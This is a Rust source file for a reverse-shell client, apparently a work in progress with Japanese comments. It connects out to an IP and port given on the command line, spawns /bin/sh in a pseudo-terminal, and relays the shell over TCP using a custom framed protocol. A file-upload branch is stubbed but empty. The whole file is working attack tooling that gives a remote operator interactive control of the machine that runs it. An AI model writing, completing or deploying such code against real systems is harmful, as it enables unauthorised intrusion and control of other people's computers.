use std::{
    io::{BufRead, BufReader, Read, Write},
    net::{IpAddr, SocketAddr, TcpStream},
    str::FromStr,
};

use clap::Parser;
use portable_pty::{native_pty_system, CommandBuilder, PtySize};

#[derive(Parser, Debug)]
struct Args {
    #[arg(short, long)]
    ip: String,

    #[arg(short, long)]
    port: u16,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    let ip = IpAddr::from_str(&args.ip).unwrap();
    spawn_shell_tunnel(ip, args.port).await;
}

async fn spawn_shell_tunnel(ip: IpAddr, port: u16) {
    let addr = SocketAddr::new(ip, port);
    let tcp_stream = TcpStream::connect(addr).unwrap();

    let pair = native_pty_system()
        .openpty(PtySize {
            rows: 24,
            cols: 80,
            // Not all systems support pixel_width, pixel_height,
            // but it is good practice to set it to something
            // that matches the size of the selected font.  That
            // is more complex than can be shown here in this
            // brief example though!
            pixel_width: 0,
            pixel_height: 0,
        })
        .unwrap();

    // Spawn a shell into the pty
    let cmd = CommandBuilder::new("/bin/sh");
    let _child = pair.slave.spawn_command(cmd).unwrap();
    let pty_reader = pair.master.try_clone_reader().unwrap();
    let pty_writer = pair.master.take_writer().unwrap();

    // let t1 = pipe_thread(pty_reader, tcp_stream.try_clone().unwrap());
    let task1 = to_tcp_stream(tcp_stream.try_clone().unwrap(), pty_reader);
    let task2 = from_tcp_stream(pty_writer, tcp_stream);

    task1.await.unwrap();
    task2.await.unwrap();
}

fn to_tcp_stream<R>(mut writer: TcpStream, reader: R) -> tokio::task::JoinHandle<()>
where
    R: std::io::Read + Send + 'static,
{
    tokio::spawn(async move {
        let mut buffer = [0; 1024];
        let mut reader = BufReader::new(reader);
        loop {
            let len = reader.read(&mut buffer).unwrap();
            if len == 0 {
                break;
            }
            writer.write_all(&buffer[..len]).unwrap();
            writer.flush().unwrap();
        }
    })
}

fn from_tcp_stream<W>(mut writer: W, reader: TcpStream) -> tokio::task::JoinHandle<()>
where
    W: std::io::Write + Send + 'static,
{
    tokio::spawn(async move {
        // async fn read(reader: &mut BufReader<TcpStream>, buffer: &mut [u8]) -> usize {
        //     reader.read(buffer).unwrap()
        // }

        // async fn read_until(
        //     reader: &mut BufReader<TcpStream>,
        //     buffer: &mut Vec<u8>,
        //     delimiter: u8,
        // ) -> usize {
        //     reader.read_until(delimiter, buffer).unwrap()
        // }

        let mut reader = BufReader::new(reader);

        // let mut is_transporting = false;
        let mut data_type = DataType::Header;

        enum DataType {
            Header,
            Shell(usize),
            Upload(usize),
        }

        loop {
            match data_type {
                DataType::Header => {
                    {
                        let mut buffer = Vec::new();
                        let len = reader.read_until(0xff, &mut buffer).unwrap();
                        if len == 0 {
                            break;
                        } else if len != 1 {
                            panic!("さっき送信されていたデータが残っているのはおかしい。is_transportingがfalseになっているときは、データの初めはかならず0xffから始まるヘッダーが来る。");
                        }
                        println!("{:?}", buffer);
                    }

                    let mut buffer = Vec::new();
                    let len = reader.read_until(0xff, &mut buffer).unwrap();
                    if len == 0 {
                        break;
                    } else if len != 10 {
                        panic!("ヘッダーは0xff datatype(1) datasize(8) 0xffの形なので、10バイトなくてはおかしい(最初の0xffは取得済み)。");
                    }
                    let content = buffer.strip_suffix(&[0xff]).unwrap();

                    let data_size = {
                        let mut size_buffer = [0; 8];

                        for (i, d) in content.get(1..).unwrap().iter().enumerate() {
                            println!("{:?}", content);
                            size_buffer[i] = *d;
                        }

                        usize::from_le_bytes(size_buffer)
                    };

                    data_type = match buffer[0] {
                        0x01 => DataType::Shell(data_size),
                        0x02 => DataType::Upload(data_size),
                        _ => panic!("undefined data type"),
                    };
                }
                DataType::Shell(size) => {
                    let mut buffer = vec![0; size];
                    reader.read_exact(&mut buffer).unwrap();
                    println!("{:?}", &buffer[..size]);
                    writer.write_all(&buffer[..size]).unwrap();
                    writer.flush().unwrap();
                    data_type = DataType::Header;
                }
                DataType::Upload(size) => {}
                _ => (),
            }
            // let len = reader.read(&mut buffer).unwrap();
            // if len == 0 {
            // break;
            // }

            // if !is_transporting {
            //     let pos_ff = buffer.iter().position(|x| *x == 0xff).unwrap();

            //     if buffer.get(pos_ff + 1).is_none() {
            //         let mut buffer_add = Vec::new();
            //         let len_add = reader.read_until(0xff, &mut buffer_add).unwrap();
            //         if len_add == 0 {
            //             break;
            //         }
            //     }

            // }

            // println!("{:?}", &buffer[..len]);
            // writer.write_all(&buffer[..len]).unwrap();
            // writer.flush().unwrap();
        }
    })
}
